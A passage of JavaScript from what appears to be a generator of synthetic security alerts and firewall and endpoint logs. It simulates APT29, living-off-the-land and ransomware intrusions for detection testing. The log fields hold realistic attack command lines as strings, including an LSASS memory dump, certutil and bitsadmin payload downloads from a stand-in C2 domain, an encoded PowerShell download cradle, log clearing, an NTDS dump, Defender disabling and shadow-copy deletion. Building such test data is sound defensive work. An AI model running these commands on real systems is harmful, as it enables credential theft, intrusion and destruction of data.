Access',technique:'T1566.002',techniqueName:'Spearphishing Link',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,226)),event:{kind:"alert",category:["malware"],severity:99},rule:{name:"Phishing Attack Chain Detected",severity:"critical",risk_score:99},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user}})});return e;}
function generatePhishingLateralScenario(){const ctx=makeCtx(),base=new Date(Date.now()-90*60000),events=generatePhishingScenario().map(e=>({...e,timestamp:new Date(e.timestamp.getTime()-50*60000)}));events.push({step:8,timestamp:tsOff(base,55*60),description:'LSASS memory access — credential dumping (Mimikatz)',source:'Endpoint Telemetry',severity:'critical',tactic:'Credential Access',technique:'T1003.001',techniqueName:'LSASS Memory',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,55*60)),event:{kind:"event",category:["process"],action:"process_memory_access"},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"rundll32.exe",command_line:`rundll32.exe comsvcs.dll, MiniDump 640 ${ctx.stagingDir}lsass.dmp full`},target:{process:{name:"lsass.exe",pid:640}}})});events.push({step:9,timestamp:tsOff(base,62*60),description:`Successful network logon to ${ctx.secondHost.hostname} via Pass-the-Hash`,source:'Windows Security',severity:'critical',tactic:'Lateral Movement',technique:'T1550.002',techniqueName:'Pass the Hash',log:`<Event><System><EventID>4624</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,62*60))}"/><Computer>${ctx.secondHost.hostname}.contoso.com</Computer></System><EventData><Data Name="TargetUserName">${ctx.victim.user}</Data><Data Name="LogonType">3</Data><Data Name="AuthenticationPackageName">NTLM</Data><Data Name="IpAddress">${ctx.victim.ip}</Data></EventData></Event>`});events.push({step:10,timestamp:tsOff(base,63*60),description:`Remote process execution on ${ctx.secondHost.hostname} via PsExec`,source:'Endpoint Telemetry',severity:'critical',tactic:'Lateral Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,63*60)),event:{kind:"event",category:["process"],type:["start"]},host:{name:ctx.secondHost.hostname,hostname:ctx.secondHost.hostname},user:{name:ctx.secondHost.user},process:{name:"PSEXESVC.exe",command_line:"cmd.exe /c whoami & net localgroup administrators"}})});events.push({step:11,timestamp:tsOff(base,65*60),description:'Elastic Security alert — Lateral Movement chain confirmed on 2 hosts',source:'Elastic Security Alert',severity:'critical',tactic:'Lateral Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,65*60)),event:{kind:"alert",severity:99},rule:{name:"Phishing → Credential Dump → Lateral Movement",severity:"critical",risk_score:99},affected_hosts:[ctx.victim.hostname,ctx.secondHost.hostname]})});return events;}
function generateExfiltrationScenario(){const ctx=makeCtx(),base=new Date(Date.now()-60*60000),e=[];e.push({step:1,timestamp:tsOff(base,0),description:'Sensitive files staged in temp directory',source:'Endpoint Telemetry',severity:'high',tactic:'Collection',technique:'T1074.001',techniqueName:'Local Data Staging',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,0)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"robocopy.exe",command_line:`robocopy C:\\Users\\${ctx.victim.user}\\Documents\\Finance ${ctx.stagingDir}data /E`}})});e.push({step:2,timestamp:tsOff(base,5*60),description:'Data compressed with password-protected 7-Zip archive',source:'Endpoint Telemetry',severity:'high',tactic:'Collection',technique:'T1560.001',techniqueName:'Archive via Utility',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,5*60)),event:{kind:"event",category:["process"]},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user},process:{name:"7z.exe",command_line:`7z a -tzip -p"Sup3rS3cr3t!" ${ctx.stagingDir}archive.zip ${ctx.stagingDir}data\\*`}})});e.push({step:3,timestamp:tsOff(base,12*60),description:'Large HTTPS upload to unknown cloud service (50MB+)',source:'Fortinet FortiGate',severity:'high',tactic:'Exfiltration',technique:'T1048.003',techniqueName:'Non-Application Layer Protocol',log:`date=${tsOff(base,12*60).toISOString().split('T')[0]} time=${tsOff(base,12*60).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="traffic" action="accept" srcip=${ctx.victim.ip} dstip=104.18.22.44 dstport=443 hostname="file-transfer-service.io" sentbyte=54525952 msg="Unusually large upload detected"`});e.push({step:4,timestamp:tsOff(base,20*60),description:'DNS tunneling detected — high entropy subdomains',source:'Fortinet FortiGate',severity:'critical',tactic:'Exfiltration',technique:'T1048.001',techniqueName:'Exfiltration Over Alternative Protocol',log:`date=${tsOff(base,20*60).toISOString().split('T')[0]} time=${tsOff(base,20*60).toTimeString().split(' ')[0]} devname="FGT-EDGE-01" type="utm" subtype="dns" action="blocked" srcip=${ctx.victim.ip} dnsquery="bG9yZW1pcHN1bQ==.${ctx.c2Domain}" attack="DNS.Exfiltration" severity="critical"`});e.push({step:5,timestamp:tsOff(base,25*60),description:'Audit log cleared — attacker covering tracks (Event 1102)',source:'Windows Security',severity:'critical',tactic:'Defense Evasion',technique:'T1070.001',techniqueName:'Clear Windows Event Logs',log:`<Event><System><EventID>1102</EventID><TimeCreated SystemTime="${formatTimestamp(tsOff(base,25*60))}"/><Channel>Security</Channel><Computer>${ctx.victim.hostname}.contoso.com</Computer></System><EventData><Data Name="SubjectUserName">${ctx.victim.user}</Data><Data Name="SubjectDomainName">CONTOSO</Data></EventData></Event>`});e.push({step:6,timestamp:tsOff(base,26*60),description:'Elastic Security alert — Data Exfiltration confirmed',source:'Elastic Security Alert',severity:'critical',tactic:'Exfiltration',technique:'T1048',techniqueName:'Exfiltration Over Alternative Protocol',log:JSON.stringify({"@timestamp":formatTimestamp(tsOff(base,26*60)),event:{kind:"alert",severity:99},rule:{name:"Multi-Vector Data Exfiltration Detected",severity:"critical",risk_score:97},host:{name:ctx.victim.hostname,hostname:ctx.victim.hostname},user:{name:ctx.victim.user}})});return e;}
// ─── APT Alert Scenarios ──────────────────────────────────────────────────────
const MITRE_TAC={
  'Initial Access':'TA0001','Execution':'TA0002','Persistence':'TA0003',
  'Privilege Escalation':'TA0004','Defense Evasion':'TA0005','Credential Access':'TA0006',
  'Discovery':'TA0007','Lateral Movement':'TA0008','Collection':'TA0009',
  'Command and Control':'TA0011','Exfiltration':'TA0010','Impact':'TA0040',
};
const makeUuid=()=>[randomHex(8),randomHex(4),randomHex(4),randomHex(4),randomHex(12)].join('-');
function makeAlert(ts,{ruleName,severity,riskScore,tactic,technique,techniqueName,host,user,proc,net,extra={}}){
  const tacId=MITRE_TAC[tactic]||'TA0000';
  return{
    '@timestamp':ts.toISOString(),
    event:{kind:'signal',category:['intrusion_detection'],outcome:'success'},
    kibana:{alert:{
      uuid:makeUuid(),
      rule:{uuid:makeUuid(),name:ruleName,description:ruleName,category:'Custom Query Rule',consumer:'siem',producer:'siem',rule_type_id:'siem.queryRule',enabled:true,
        threat:[{framework:'MITRE ATT&CK',tactic:{id:tacId,name:tactic,reference:`https://attack.mitre.org/tactics/${tacId}/`},technique:technique?[{id:technique,name:techniqueName||technique,reference:`https://attack.mitre.org/techniques/${technique.split('.').join('/')}/`}]:[]}],
      },
      severity,risk_score:riskScore,status:'open',workflow_status:'open',
      original_time:new Date(ts.getTime()-rand(1000,15000)).toISOString(),
    }},
    host:{name:host.name,hostname:host.name,ip:[host.ip],os:{name:host.os||'Windows 10',family:'windows'}},
    user:{name:user.name,domain:user.domain||'CONTOSO'},
    ...(proc?{process:{name:proc.name,pid:proc.pid||rand(1000,65535),command_line:proc.cmd,parent:{name:proc.parent||'explorer.exe'}}}:{}),
    ...(net?{destination:{ip:net.ip,port:net.port},network:{direction:'outbound',transport:net.proto||'tcp'},source:{ip:host.ip}}:{}),
    ...extra,
  };
}

function generateAPT29Scenario(){
  const ctx=makeCtx(),base=new Date(Date.now()-4*3600000);
  const t=s=>new Date(base.getTime()+s*1000);
  const v1={name:ctx.victim.hostname,ip:ctx.victim.ip,os:'Windows 10'};
  const v2={name:ctx.secondHost.hostname,ip:ctx.secondHost.ip,os:'Windows Server 2019'};
  const u1={name:ctx.victim.user,domain:'CONTOSO'};
  const alerts=[
    makeAlert(t(0),{ruleName:'Phishing Email with Malicious OAuth Link Detected',severity:'medium',riskScore:47,tactic:'Initial Access',technique:'T1566.002',techniqueName:'Spearphishing Link',host:v1,user:u1,extra:{email:{from:{address:`no-reply@${ctx.phishingDomain}`},subject:'Action Required: Verify Your Account Access',to:{address:ctx.victim.email}}}}),
    makeAlert(t(310),{ruleName:'Malicious File Executed from Downloads Folder',severity:'high',riskScore:73,tactic:'Execution',technique:'T1204.002',techniqueName:'Malicious File',host:v1,user:u1,proc:{name:ctx.malwareFile,cmd:`"C:\\Users\\${u1.name}\\Downloads\\${ctx.malwareFile}"`,parent:'chrome.exe'},extra:{file:{hash:{sha256:ctx.malwareHash},name:ctx.malwareFile}}}),
    makeAlert(t(325),{ruleName:'Suspicious Encoded PowerShell via Malicious Process',severity:'high',riskScore:77,tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',host:v1,user:u1,proc:{name:'powershell.exe',cmd:'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn...',parent:ctx.malwareFile}}),
    makeAlert(t(360),{ruleName:'Registry Run Key Added for Boot Persistence',severity:'high',riskScore:71,tactic:'Persistence',technique:'T1547.001',techniqueName:'Registry Run Keys / Startup Folder',host:v1,user:u1,proc:{name:'reg.exe',cmd:'reg.exe ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftEdgeUpdate /t REG_SZ /d "C:\\ProgramData\\Intel\\msedge32.exe" /f',parent:'powershell.exe'}}),
    makeAlert(t(400),{ruleName:'Windows Defender Exclusion Path Added',severity:'high',riskScore:69,tactic:'Defense Evasion',technique:'T1562.001',techniqueName:'Disable or Modify Tools',host:v1,user:u1,proc:{name:'powershell.exe',cmd:'Add-MpPreference -ExclusionPath "C:\\ProgramData\\Intel\\"',parent:'powershell.exe'}}),
    makeAlert(t(430),{ruleName:'BITS Job Used to Download Remote Payload',severity:'medium',riskScore:53,tactic:'Defense Evasion',technique:'T1197',techniqueName:'BITS Jobs',host:v1,user:u1,proc:{name:'bitsadmin.exe',cmd:`bitsadmin.exe /transfer upd /download /priority high http://${ctx.c2Domain}/update.dll C:\\ProgramData\\Intel\\update.dll`,parent:'powershell.exe'}}),
    makeAlert(t(600),{ruleName:'UAC Bypass via Fodhelper.exe Registry Hijack',severity:'high',riskScore:79,tactic:'Privilege Escalation',technique:'T1548.002',techniqueName:'Bypass User Account Control',host:v1,user:u1,proc:{name:'fodhelper.exe',cmd:'fodhelper.exe',parent:'powershell.exe'},extra:{registry:{path:'HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command',value:`C:\\ProgramData\\Intel\\msedge32.exe`}}}),
    makeAlert(t(680),{ruleName:'WMI Event Subscription Created for Persistence',severity:'high',riskScore:75,tactic:'Persistence',technique:'T1546.003',techniqueName:'Windows Management Instrumentation Event Subscription',host:v1,user:u1,proc:{name:'wmic.exe',cmd:`wmic.exe /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="MicrosoftUpdate", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`,parent:'powershell.exe'}}),
    makeAlert(t(1800),{ruleName:'LSASS Memory Access — Credential Dumping Attempt',severity:'critical',riskScore:93,tactic:'Credential Access',technique:'T1003.001',techniqueName:'LSASS Memory',host:v1,user:u1,proc:{name:'rundll32.exe',cmd:`rundll32.exe comsvcs.dll, MiniDump 640 ${ctx.stagingDir}lsass.dmp full`,parent:'powershell.exe'},extra:{target:{process:{name:'lsass.exe',pid:640}}}}),
    makeAlert(t(2100),{ruleName:'Domain Account Enumeration via Net.exe',severity:'medium',riskScore:47,tactic:'Discovery',technique:'T1087.002',techniqueName:'Domain Account',host:v1,user:u1,proc:{name:'net.exe',cmd:'net.exe user /domain && net.exe group "Domain Admins" /domain',parent:'cmd.exe'}}),
    makeAlert(t(2400),{ruleName:'Successful NTLM Pass-the-Hash Authentication',severity:'critical',riskScore:91,tactic:'Lateral Movement',technique:'T1550.002',techniqueName:'Pass the Hash',host:v2,user:u1,net:{ip:ctx.victim.ip,port:445},extra:{winlog:{event_id:4624,channel:'Security',event_data:{LogonType:'3',AuthenticationPackageName:'NTLM',TargetUserName:u1.name,TargetDomainName:'CONTOSO'}}}}),
    makeAlert(t(2460),{ruleName:'Remote Service Execution via Windows Admin Shares',severity:'critical',riskScore:89,tactic:'Lateral Movement',technique:'T1021.002',techniqueName:'SMB/Windows Admin Shares',host:v2,user:u1,proc:{name:'PSEXESVC.exe',cmd:'cmd.exe /c whoami /all && net localgroup administrators',parent:'services.exe'}}),
    makeAlert(t(3000),{ruleName:'Bulk File Copy to Staging Directory',severity:'high',riskScore:73,tactic:'Collection',technique:'T1074.001',techniqueName:'Local Data Staging',host:v1,user:u1,proc:{name:'robocopy.exe',cmd:`robocopy.exe "C:\\Users\\${u1.name}\\Documents\\Finance" "${ctx.stagingDir}exfil" /E /Z /COPY:DAT`}}),
    makeAlert(t(3300),{ruleName:'Outbound C2 Beacon to Known APT29 Infrastructure',severity:'critical',riskScore:97,tactic:'Command and Control',technique:'T1071.001',techniqueName:'Web Protocols',host:v1,user:u1,net:{ip:ctx.c2IP,port:443},extra:{url:{domain:ctx.c2Domain,scheme:'https'},network:{bytes:rand(4096,32768)},threat:{indicator:{ip:ctx.c2IP,domain:ctx.c2Domain,type:'domain-name'}}}}),
    makeAlert(t(3600),{ruleName:'Large Data Exfiltration over Encrypted C2 Channel',severity:'critical',riskScore:95,tactic:'Exfiltration',technique:'T1041',techniqueName:'Exfiltration Over C2 Channel',host:v1,user:u1,net:{ip:ctx.c2IP2,port:443},extra:{url:{domain:ctx.c2Domain},network:{bytes:rand(52428800,209715200)},threat:{indicator:{ip:ctx.c2IP2,type:'ipv4-addr'}}}}),
  ];
  return{meta:{name:'APT29 — Midnight Blizzard',attackerProfile:'Russia-nexus state-sponsored (SVR)',targetOrg:'Enterprise',description:`Full kill-chain APT intrusion: OAuth phishing → ${ctx.malwareFamily} malware (hash: ${ctx.malwareHash.slice(0,16)}…) → persistence → UAC bypass → WMI subscription → credential dump → lateral movement → C2 (${ctx.c2Domain}) → exfiltration. 15 correlated alerts across 11 MITRE tactics.`,timeRange:{from:t(0),to:t(3600)}},ctx,alerts};
}

function generateLotLScenario(){
  const ctx=makeCtx(),base=new Date(Date.now()-6*3600000);
  const t=s=>new Date(base.getTime()+s*1000);
  const v1={name:ctx.victim.hostname,ip:ctx.victim.ip,os:'Windows 11 Enterprise'};
  const v2={name:ctx.secondHost.hostname,ip:ctx.secondHost.ip,os:'Windows Server 2022'};
  const u1={name:ctx.victim.user,domain:'CONTOSO'};
  const alerts=[
    makeAlert(t(0),{ruleName:'Certutil.exe Remote File Download',severity:'medium',riskScore:53,tactic:'Initial Access',technique:'T1105',techniqueName:'Ingress Tool Transfer',host:v1,user:u1,proc:{name:'certutil.exe',cmd:`certutil.exe -urlcache -split -f http://${ctx.c2Domain}/update.txt C:\\Windows\\Temp\\update.txt`,parent:'cmd.exe'}}),
    makeAlert(t(120),{ruleName:'MSHTA Executing Remote Script (Fileless Dropper)',severity:'high',riskScore:77,tactic:'Execution',technique:'T1218.005',techniqueName:'Mshta',host:v1,user:u1,proc:{name:'mshta.exe',cmd:`mshta.exe vbscript:CreateObject("Wscript.Shell").Run("cmd /c powershell -w hidden ...",0,True)(window.close)`,parent:'cmd.exe'}}),
    makeAlert(t(200),{ruleName:'Scheduled Task Created via Schtasks for Persistence',severity:'high',riskScore:71,tactic:'Persistence',technique:'T1053.005',techniqueName:'Scheduled Task',host:v1,user:u1,proc:{name:'schtasks.exe',cmd:'schtasks.exe /Create /SC ONLOGON /TN "Microsoft\\Windows\\WDF\\WdfDevice" /TR "wscript.exe //B C:\\Windows\\System32\\Tasks\\wdf.vbs" /RU SYSTEM /F',parent:'cmd.exe'}}),
    makeAlert(t(280),{ruleName:'Security Event Logs Cleared via Wevtutil',severity:'high',riskScore:73,tactic:'Defense Evasion',technique:'T1070.001',techniqueName:'Clear Windows Event Logs',host:v1,user:u1,proc:{name:'wevtutil.exe',cmd:'wevtutil.exe cl Security & wevtutil.exe cl System & wevtutil.exe cl Application',parent:'cmd.exe'}}),
    makeAlert(t(420),{ruleName:'Token Impersonation via SeDebugPrivilege',severity:'critical',riskScore:87,tactic:'Privilege Escalation',technique:'T1134.001',techniqueName:'Token Impersonation/Theft',host:v1,user:u1,proc:{name:'cmd.exe',cmd:'cmd.exe /c whoami /priv | findstr "SeDebug"',parent:'wscript.exe'}}),
    makeAlert(t(600),{ruleName:'NTDS.dit Shadow Copy — Active Directory Credential Dump',severity:'critical',riskScore:95,tactic:'Credential Access',technique:'T1003.003',techniqueName:'NTDS',host:v2,user:{name:'SYSTEM',domain:'CONTOSO'},proc:{name:'ntdsutil.exe',cmd:'ntdsutil.exe "activate instance ntds" ifm "create full C:\\Windows\\Temp\\IFM" quit quit',parent:'cmd.exe'}}),
    makeAlert(t(900),{ruleName:'WMI Remote Process Execution (Lateral Movement)',severity:'critical',riskScore:87,tactic:'Lateral Movement',technique:'T1021.006',techniqueName:'Windows Remote Management',host:v2,user:u1,proc:{name:'wmic.exe',cmd:`wmic.exe /node:"${ctx.secondHost.ip}" /user:"CONTOSO\\${u1.name}" process call create "cmd.exe /c ipconfig /all & net user > C:\\Temp\\out.txt"`,parent:'cmd.exe'}}),
    makeAlert(t(1200),{ruleName:'Domain Controller and Admin Group Enumeration',severity:'medium',riskScore:47,tactic:'Discovery',technique:'T1018',techniqueName:'Remote System Discovery',host:v2,user:u1,proc:{name:'net.exe',cmd:'net.exe group "Domain Controllers" /domain & net.exe group "Enterprise Admins" /domain',parent:'cmd.exe'}}),
    makeAlert(t(1500),{ruleName:'Data Archive Created Using Built-in Compression',severity:'high',riskScore:67,tactic:'Collection',technique:'T1560.001',techniqueName:'Archive via Utility',host:v1,user:u1,proc:{name:'powershell.exe',cmd:`Compress-Archive -Path "${ctx.stagingDir}*" -DestinationPath C:\\Windows\\Temp\\logs_backup.zip -Force`,parent:'wscript.exe'}}),
    makeAlert(t(1800),{ruleName:'Anomalous HTTPS Transfer to Non-Corporate IP',severity:'critical',riskScore:91,tactic:'Exfiltration',technique:'T1048.003',techniqueName:'Exfiltration Over Unencrypted Protocol',host:v1,user:u1,net:{ip:ctx.c2IP,port:443},extra:{network:{bytes:rand(10485760,78643200)},url:{domain:ctx.c2Domain}}}),
  ];
  return{meta:{name:'APT — Living off the Land',attackerProfile:'Sophisticated threat actor (no custom malware)',targetOrg:'Enterprise',description:'Fileless intrusion using only Windows built-in utilities: certutil → mshta → schtasks → log clearing → token privilege abuse → NTDS dump → WMI lateral movement → data exfiltration. No malware dropped.',timeRange:{from:t(0),to:t(1800)}},ctx,alerts};
}

function generateRansomwareScenario(){
  const ctx=makeCtx(),base=new Date(Date.now()-2*3600000);
  const t=s=>new Date(base.getTime()+s*1000);
  const v1={name:ctx.victim.hostname,ip:ctx.victim.ip,os:'Windows 10'};
  // Second host — gets encrypted too via SMB spread
  const v2={name:ctx.secondHost.hostname,ip:ctx.secondHost.ip,os:'Windows 10'};
  const u1={name:ctx.victim.user,domain:'CONTOSO'};
  const alerts=[
    makeAlert(t(0),{ruleName:'Office Application Spawned Windows Script Host',severity:'high',riskScore:73,tactic:'Initial Access',technique:'T1566.001',techniqueName:'Spearphishing Attachment',host:v1,user:u1,proc:{name:'wscript.exe',cmd:`wscript.exe "C:\\Users\\${u1.name}\\Downloads\\Invoice_March.docm.vbs"`,parent:'WINWORD.EXE'},extra:{file:{name:'Invoice_March.docm',extension:'.docm',hash:{sha256:ctx.malwareHash}}}}),
    makeAlert(t(180),{ruleName:'Macro-Spawned Encoded PowerShell — Fileless Stage',severity:'high',riskScore:79,tactic:'Execution',technique:'T1059.001',techniqueName:'PowerShell',host:v1,user:u1,proc:{name:'powershell.exe',cmd:'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAn...',parent:'wscript.exe'}}),
    makeAlert(t(240),{ruleName:'Ransomware Staging: Volume Shadow Copies Deleted',severity:'critical',riskScore:93,tactic:'Impact',technique:'T1490',techniqueName:'Inhibit System Recovery',host:v1,user:u1,proc:{name:'vssadmin.exe',cmd:'vssadmin.exe delete shadows /all /quiet',parent:'powershell.exe'}}),
    makeAlert(t(270),{ruleName:'Backup Catalog Deleted via wbadmin',severity:'critical',riskScore:91,tactic:'Impact',technique:'T1490',techniqueName:'Inhibit System Recovery',host:v1,user:u1,proc:{name:'wbadmin.exe',cmd:'wbadmin.exe delete catalog -quiet',parent:'powershell.exe'}}),
    makeAlert(t(300),{ruleName:'Windows Defender Real-Time Protection Disabled',severity:'high',riskScore:81,tactic:'Defense Evasion',technique:'T1562.001',techniqueName:'Disable or Modify Tools',host:v1,user:u1,proc:{name:'powershell.exe',cmd:'Set-MpPreference -DisableRealtimeMonitoring $true',parent:'powershell.exe'}}),
    makeAlert(t(330),{ruleName:'Mass File Rename — Ransomware Encryption in Progress',severity:'critical',riskScore:99,tactic:'Impact',technique:'T1486',techniqueName:'Data Encrypted for Impact',host:v1,user:u1,proc:{name:ctx.malwareFile,cmd:`C:\\ProgramData\\${ctx.malwareFile}`,parent:'powershell.exe'},extra:{file:{name:'Annual_Report_2024.docx.locked',extension:'.locked'},message:`Rapid mass file encryption: ${rand(1500,3000)} files renamed in 90 seconds`}}),
    makeAlert(t(360),{ruleName:'Ransom Note Dropped in Multiple Directories',severity:'critical',riskScore:97,tactic:'Impact',technique:'T1486',techniqueName:'Data Encrypted for Impact',host:v1,user:u1,proc:{name:ctx.malwareFile,cmd:`C:\\ProgramData\\${ctx.malwareFile}`,parent:'powershell.exe'},extra:{file:{name:'README_DECRYPT.txt',path:'C:\\Users\\Public\\README_DECRYPT.txt'}}}),
    makeAlert(t(390),{ruleName:'EternalBlue SMB Exploitation Attempt — Ransomware Lateral Spread',severity:'critical',riskScore:95,tactic:'Lateral Movement',technique:'T1210',techniqueName:'Exploitation of Remote Services',host:v1,user:u1,net:{ip:ctx.secondHost.ip,port:445},extra:{vulnerability:{id:'CVE-2017-0144',description:'EternalBlue MS17-010 SMB exploit'},network:{bytes:rand(65536,262144)}}}),
    makeAlert(t(420),{ruleName:'Mass File Rename — Ransomware Encryption in Progress',severity:'critical',riskScore:99,tactic:'Impact',technique:'T1486',techniqueName:'Data Encrypted for Impact',host:v2,user:u1,proc:{name:ctx.malwareFile,cmd:`\\\\${v1.name}\\C$\\ProgramData\\${ctx.malwareFile}`,parent:'services.exe'},extra:{file:{name:'Q3_Financials.xlsx.locked',extension:'.locked'},message:`Lateral ransomware: ${rand(800,2000)} files encrypted on ${v2.name}`}}),
  ];
  return{meta:{name:'Ransomware Outbreak',attackerProfile:'Financially motivated threat actor',targetOrg:'Enterprise',description:`Office macro → fileless PowerShell → VSS/backup deletion → Defender disabled → mass encryption (${ctx.malwareFamily}) → EternalBlue SMB spread to second host. ${alerts.length} correlated alerts across 3 MITRE tactics.`,timeRange:{from:t(0),to:t(420)}},ctx,alerts};
}

function generateScenarioNoise(level,tr=120){
  if(!level||level==='off')return{};
  const conf={
    low:   {windows:160, endpoint:100, fortinet:240},
    medium:{windows:400, endpoint:240, fortinet:600, email:80,  linux:120},
    high:  {windows:1000,endpoint:600, fortinet:1200,email:200, linux:300, paloalto:400},
  }[level]||{};
  const noise={};
  setPool(level==='high'?20:level==='medium'?10:5);
  Object.entries(conf).forEach(([vid,count])=>{
    const v=VENDORS.find(x=>x.id===vid);if(!v)return;
    // Endpoint noise must not generate event.kind="alert" docs — those go to
    // logs-endpoint.alerts-default and Attack Discovery counts them as External Alerts,
    // polluting the correlation with the real APT scenario alerts.
    if(vid==='endpoint'){
      noise[vid]=generateTimestamps(count,tr).map(ts=>Math.random()<0.57?genEndpointProcess(ts):genEndpointNetwork(ts));
    }else{
      noise[vid]=v.generator(count,tr);
    }
  });
  setPool(null);
  return noise;
}

// Generates firewall + endpoint logs that directly corroborate the attack scenario.
// Uses real IOCs from ctx so SOC investigation searches find them.
// Also includes 2 additional internal hosts connecting to the same C2 — surfaces
// lateral reach and gives the automated workflow multiple endpoints to investigate.
function generateScenarioCoreLogs(ctx, timeRange){
  const from=timeRange?.from||new Date(Date.now()-4*3600000);
  const to=timeRange?.to||new Date();
  const span=Math.max(to-from,60000);
  const rndTs=()=>new Date(from.getTime()+Math.random()*span);

  // 2 other internal hosts that also communicated with the C2
  const otherHosts=[
    {ip:`192.168.${rand(10,15)}.${rand(20,80)}`,name:_HOSTNAMES_BASE(),user:pick(_USERS_LIST)},
    {ip:`192.168.${rand(16,20)}.${rand(20,80)}`,name:_HOSTNAMES_BASE(),user:pick(_USERS_LIST)},
  ];
  const victim={ip:ctx.victim.ip,name:ctx.victim.hostname,user:ctx.victim.user};
  const allSrcs=[victim,...otherHosts];
  const logs={paloalto:[],fortinet:[],endpoint:[],windows:[]};

  // ── Palo Alto ──
  const panC2Traffic=(src,dstIp,t,bytes)=>{
    const dev=pick(PAN_DEVICES),pt=panTs(t);
    const st=new Date(t.getTime()-rand(30000,300000)),pst=panTs(st);
    const b=bytes||rand(4096,65536),bs=Math.floor(b*0.3),br=b-bs,pk=rand(10,500);
    return `<14>${syslogTimestamp(t)} ${dev} 1,${pt},${PAN_SERIAL},TRAFFIC,end,0,${pt},${src.ip},${dstIp},0.0.0.0,0.0.0.0,allow-internet,${src.user},,ssl,vsys1,trust,untrust,ethernet1/1,ethernet1/2,default,0,${rand(1,65535)},1,${randomHighPort()},443,0,0,0x400000,tcp,allow,${b},${bs},${br},${pk},${pst},${Math.floor((t-st)/1000)},any,0,${rand(1000000,9999999)},0x0,192.168.0.0-192.168.255.255,Russia,0,${Math.floor(pk*0.4)},${pk-Math.floor(pk*0.4)},tcp-fin,0,0,0,0,vsys1,${dev},from-policy`;
  };
  const panC2Threat=(src,dstIp,t)=>{
    const dev=pick(PAN_DEVICES),pt=panTs(t);
    return `<11>${syslogTimestamp(t)} ${dev} 1,${pt},${PAN_SERIAL},THREAT,spyware,0,${pt},${src.ip},${dstIp},0.0.0.0,0.0.0.0,Block-Critical,,${src.user},ssl,vsys1,trust,untrust,ethernet1/1,ethernet1/2,default,0,${rand(1,65535)},1,${randomHighPort()},443,0,0,0x0,tcp,alert,"Generic C2 HTTPS Traffic(12345)",12345,command-and-control,high,client-to-server,${rand(1000000,9999999)},0x0,192.168.0.0-192.168.255.255,Russia`;
  };
  // Victim: multiple C2 beacons + large exfil burst
  for(let i=0;i<8;i++){
    const t=rndTs(),dst=i%3===0?ctx.c2IP2:ctx.c2IP;
    const bytes=i===7?rand(52428800,104857600):undefined;
    logs.paloalto.push(i%4===0?panC2Threat(victim,dst,t):panC2Traffic(victim,dst,t,bytes));
  }
  // Other hosts → same C2 (shows blast radius)
  otherHosts.forEach(h=>logs.paloalto.push(panC2Traffic(h,ctx.c2IP,rndTs())));

  // ── Fortinet ──
  const fortiC2Traffic=(src,dstIp,t)=>{
    const hn=`FGT-${pick(['DC','EDGE','CORE'])}-${rand(1,5)}`,b=rand(4096,524288);
    return `date=${t.toISOString().split('T')[0]} time=${t.toTimeString().split(' ')[0]} devname="${hn}" eventtime=${Math.floor(t/1000)} logid="000001${rand(1000,9999)}" type="traffic" subtype="forward" level="notice" srcip=${src.ip} srcport=${randomHighPort()} dstip=${dstIp} dstport=443 action="accept" policyname="allow-outbound" service="HTTPS" sentbyte=${Math.floor(b*0.3)} rcvdbyte=${b-Math.floor(b*0.3)} hostname="${ctx.c2Domain}" dstcountry="Russia" app="ssl" user="${src.user}"`;
  };
  const fortiC2Alert=(src,dstIp,t)=>{
    const hn=`FGT-${pick(['DC','EDGE'])}-${rand(1,3)}`;
    return `date=${t.toISOString().split('T')[0]} time=${t.toTimeString().split(' ')[0]} devname="${hn}" eventtime=${Math.floor(t/1000)} logid="042${rand(10000,99999)}" type="utm" subtype="app-ctrl" level="alert" srcip=${src.ip} dstip=${dstIp} action="detected" hostname="${ctx.c2Domain}" attack="C2.Beacon.APT29" severity="critical" msg="Known APT29 C2 domain contact detected" user="${src.user}"`;
  };
  allSrcs.forEach((src,i)=>{
    logs.fortinet.push(i===0?fortiC2Alert(src,ctx.c2IP,rndTs()):fortiC2Traffic(src,ctx.c2IP,rndTs()));
    if(i===0){
      logs.fortinet.push(fortiC2Traffic(src,ctx.c2IP,rndTs()));
      logs.fortinet.push(fortiC2Traffic(src,ctx.c2IP2,rndTs()));
    }
  });

  // ── Endpoint process + network events with correlated PIDs ──
  // Each host gets a fixed PID for the malware process so the SOC agent can pivot:
  //   Palo Alto (no PID) → endpoint network event (has PID) → process creation (same PID, full parent chain)
  const victimPid=ctx.malwarePid;
  const victimParentPid=ctx.parentPid;
  const otherPids=otherHosts.map(()=>rand(2000,32000));

  const epProcessCreate=(host,pid,parentPid,t)=>JSON.stringify({
    '@timestamp':formatTimestamp(t),
    event:{kind:'event',category:['process'],type:['start'],action:'process_creation'},
